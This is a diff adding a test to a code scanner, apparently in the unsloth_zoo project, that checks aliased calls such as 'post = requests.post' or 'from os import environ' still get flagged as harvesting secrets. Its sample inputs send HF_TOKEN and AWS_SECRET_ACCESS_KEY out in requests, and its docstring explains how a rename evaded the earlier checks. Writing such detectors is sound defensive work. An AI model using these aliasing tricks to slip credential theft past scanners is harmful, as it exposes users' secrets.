@@ -3380,6 +3380,57 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     ) == []
 
 
+def test_a_write_or_an_environment_read_under_another_name_refuses_it():
+    """One rename was enough to walk past both checks.
+
+    `post = requests.post` leaves the call site an ast.Name, so the write check,
+    which read attributes, saw no write and a POST of HF_TOKEN to the hub was
+    suppressed. `getenv = os.getenv` and `from os import environ` do the same to
+    the environment read: the secret it takes never enters the collected set, so
+    the set holds the hub token alone and satisfies the allow-list.
+
+    Following an alias means following assignment through every shape. Naming
+    one at all is enough to refuse, and none of these names appears in any
+    position in the 21 real gguf-py and converter modules.
+    """
+    scan_converter_source = _load(
+        "converter_scan_alias_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    for body in (
+        'import os\nimport requests\n' + hub
+        + 'post = requests.post\npost(HUB, data = os.environ["HF_TOKEN"])\n',
+        'import os\nimport requests\n' + hub
+        + 'getenv = os.getenv\n'
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": getenv("AWS_SECRET_ACCESS_KEY")})\n',
+        'import os\nimport requests\nfrom os import getenv\n' + hub
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": getenv("AWS_SECRET_ACCESS_KEY")})\n',
+        'import os\nimport requests\nfrom os import environ\n' + hub
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": environ["AWS_SECRET_ACCESS_KEY"]})\n',
+        'import os\nimport requests\nfrom os import environ as e\n' + hub
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": e["AWS_SECRET_ACCESS_KEY"]})\n',
+    ):
+        assert any(
+            "Harvests environment variables" in f.check
+            for f in scan_converter_source(body)
+        ), body
+
+    # os.environ and os.getenv are attributes, not bare names, and upstream's
+    # own shape reads both. It must still pass.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'headers = {}\n'
+        + 'if os.environ.get("HF_TOKEN"):\n'
+        + '    headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
+        + 'requests.get(HUB, headers = headers)\n'
+    ) == []
+
+
 def test_nothing_in_the_allowance_may_raise():
     """A scanner exception is an evasion, not an error.
 
